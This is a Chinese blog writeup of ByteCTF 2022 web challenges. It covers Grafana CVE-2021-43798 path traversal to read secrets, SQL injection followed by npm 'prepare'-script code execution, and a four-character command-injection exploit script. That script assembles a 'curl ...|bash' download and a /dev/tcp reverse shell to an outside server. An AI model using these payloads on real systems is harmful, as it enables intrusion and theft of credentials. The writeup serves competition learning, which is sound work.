---
title: ByteCTF 2022 Web Writeup
date: 2022-09-26 19:20:00
updated: 2022-09-26 20:45:00
tags: [ctf, security]
description: ByteCTF2022 第9名 打的还不错的一场比赛
---

比赛时主要是做了ctf_cloud和typing_game两个题目，其中typing_game还是非预期解了，整体Web只差datamanager就AK了，不过`microservices`这道题目是大佬们出的，自己其实也没有去复现过。正好比赛结束还可以开靶机，可以抽空复现一下难题。

## easy_grafana
> You must have seen it, so you can hack it

之前也遇到过类似的题目，考的是grafana的CVE-2021-43798目录穿越漏洞。

需要注意的点是这里要加`/#/`才能成功读到文件。

可以从`/public/plugins/bargauge/#/../../../../../../../../../../../../../../etc/grafana/grafana.ini`获取secret_key `SW2YcwTIb9zpO1hoPsMm`
`/public/plugins/bargauge/#/../../../../../../../../../../../../../../var/lib/grafana/grafana.db`获取password `b0NXeVJoSXKPoSYIWt8i/GfPreRT03fO6gbMhzkPefodqe1nvGpdSROTvfHK1I3kzZy9SQnuVy9c3lVkvbyJcqRwNT6/`
这里mysql拿到了mysql的密码和key,用这个解密工具
<https://github.com/jas502n/Grafana-CVE-2021-43798>解出密码就是flag啦。

![图 1](https://s2.loli.net/2022/09/26/xLNkUDGsPvyQZKf.png)  

`ByteCTF{e292f461-285e-47fc-9210-b9cd233773cb}`

## ctf_cloud
> 改编自真实漏洞环境。在云计算日益发达的今天，许多云平台依靠其基础架构为用户提供云上开发功能，允许用户构建自己的应用，但这同样存在风险。

普通用户可以往package.json里面加信息，然后管理员才可以把这个加进去的依赖装上，首先应该是拿到管理员账号，然后再是加个有洞的依赖打RCE什么的。

/signup这个路由的password字段是拼接进去的，这里应该有注入点。

```js
router.post('/signup', function(req, res, next) {
    var username = req.body.username;
    var password = req.body.password;

    if (username == '' || password == '')
        return res.json({"code" : -1 , "message" : "Please input username and password."});

    // check if username exists
    db.get("SELECT * FROM users WHERE NAME = ?", [username], function(err, row) {
        if (err) {
            console.log(err);
            return res.json({"code" : -1, "message" : "Error executing SQL query"});
        }
        if (row) {
            console.log(row)
            return res.json({"code" : -1 , "message" : "Username already exists"});
        } else {
            // in case of sql injection , I'll reset admin's password to a new random string every time.
            var randomPassword = stringRandom(100);
            db.run(`UPDATE users SET PASSWORD = '${randomPassword}' WHERE NAME = 'admin'`, ()=>{});

            // insert new user
            var sql = `INSERT INTO users (NAME, PASSWORD, ACTIVE) VALUES (?, '${password}', 0)`;
            db.run(sql, [username], function(err) {
                if (err) {
                    console.log(err);
                    return res.json({"code" : -1, "message" : "Error executing SQL query " + sql});
                }
                return res.json({"code" : 0, "message" : "Sign up successful"});
            });
        }
    });
});
```
这里每次signup都会先重置管理员password然后执行sql语句。考虑利用堆叠注入修改管理员密码，然后直接登,但是设注册时的password参数为', 0);UPDATE users SET PASSWORD = '123' WHERE NAME = 'admin';# 但是这个函数不支持执行多条sql。

发现可以插入多行，数据表没约束用户名唯一，sqlite 的 CONFLICT 不能用。

```
ek1ng', 0), ('admin', 'ek1ng', 1);--- 
```

拿到管理员权限后，可以通过npm包的prepare属性打rce了。

1. 点重置删除 package.json 和 node_modules
2. 上传 package.json

```python
import requests


def uploadFile(url, file, filename="", contentType="text/plain"):
    if filename == "":
        filename = os.path.basename(file)
    fp = open(file, "rb")
    data = {
        "file": (filename, fp, contentType)
    }
    headers = {
        "Cookie": "connect.sid=s%3AXtdzlDJSttltRleoO5VRaqnoQzLLD2HY.14%2Be48yUMyRQgjtK2nDpYdrvrekCAwMViWMbBc7h0IU"
    }
    res = requests.post(url, files=data, headers=headers)
    fp.close()
    return res


res = uploadFile("https://eea8061294ea1d51ca4df400f54e3413.2022.capturetheflag.fun/dashboard/upload",
                 "./pkg/package.json", "package.json")
print(res.status_code, res.text)
```

```
{
  "name": "pkg",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "prepare": "cat /flag / > /usr/local/app/public/c.txt"
  },
  "keywords": [],
  "author": "",
  "license": "ISC"
}
```

3. 设置 dependencies

POST的参数

```
{"dependencies":{"pkg": "file:./public/uploads"}}
```

4. 编译
5. 访问 /c.txt 查看内容

因为这里不出网所以只能往网站目录下面写来访问。

`ByteCTF{c98ecaae-4e6e-43da-a084-1f0d99034420}`

## typing_game

### 四字符命令注入弹Shell
> 题目描述：
我是练习时长两年半的nodejs菜鸟，欢迎来玩我写的小游戏

这个题目当时出的队伍不多只有11个，不过我的做法是非预期的，用的是四字符命令注入弹shell。

通过`/report?url=<http://127.0.0.1:13002/status?cmd=ls`可以访问到/status接口并且执行4字符的命令。exp编写参考[HitconCTF2017 BabyFirst Revenge v2的exp](https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2)。

这里需要注意的是必须先`rm *`，因为`*>v`这个命令默认的顺序是按照文件名称的，那么如果没有删掉`index.js`这个文件，会导致reverse file "v" to file "x"之后，x文件里面的内容是`ls index.js -th`,这就很尴尬了。

在服务器python3 -m http.server 8888起一个server并且放一个内容为sh -i >& /dev/tcp/xx.xxx.xxx.xxx/7777 0>&1,开启端口监听弹等shell弹过来就行。

```python
# encoding:utf-8
import requests
from time import sleep
baseurl = "https://e24f9597c9ab115b5116321ffbece014.2022.capturetheflag.fun/report?url=http://localhost:13002/status?cmd="

s = requests.session()


# 将ls -t 写入文件_
list = [
    'rm *',
    # generate "g> ht- sl" to file "v"
    '>dir',
    '>sl',
    '>g\>',
    '>ht-',
    '*>v',
    # reverse file "v" to file "x", content "ls -th >g"
    '>rev',
    '*v>x',
]
# curl xx.xxx.xxx.xxx:8888|bash
list2 = [
    ">sh",
    ">ba\\",
    ">\|\\",
    ">8\\",
    ">88\\",
    ">:8\\",
    ">xx\\",
    ">x\\",
    ">x.\\",
    ">xx\\",
    ">x.\\",
    ">xx\\",
    ">x.\\",
    ">x\\",
    ">\ \\",
    ">rl\\",
    ">cu\\",
]
for i in list:
    url = baseurl+str(i)
    res = s.get(url)
    print(res.text)
    sleep(35)
for j in list2:
    url = baseurl+str(j)
    res = s.get(url)
    print(res.text)
    sleep(35)
s.get(baseurl+"sh x")
sleep(35)
print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
s.get(baseurl+"sh g")
sleep(35)
```

最后在在环境变量中找到flag。

![图 2](https://s2.loli.net/2022/09/26/WBm5zSsNua3ifo2.png)  

可能也许这也是出题人预期的一种吧不然为啥是四字符呢，假如改成3字符唯一的做法就是xss带出回显然后执行`env`拿到flag了，不过这好像没有特别大的意义吧。

### XSS带出命令执行回显
等我复现完就来写（

最近感觉题目复现的多了打比赛也没那么坐牢了，基本上都是有思路也能做出，就是熟练度的一些问题吧，继续加油。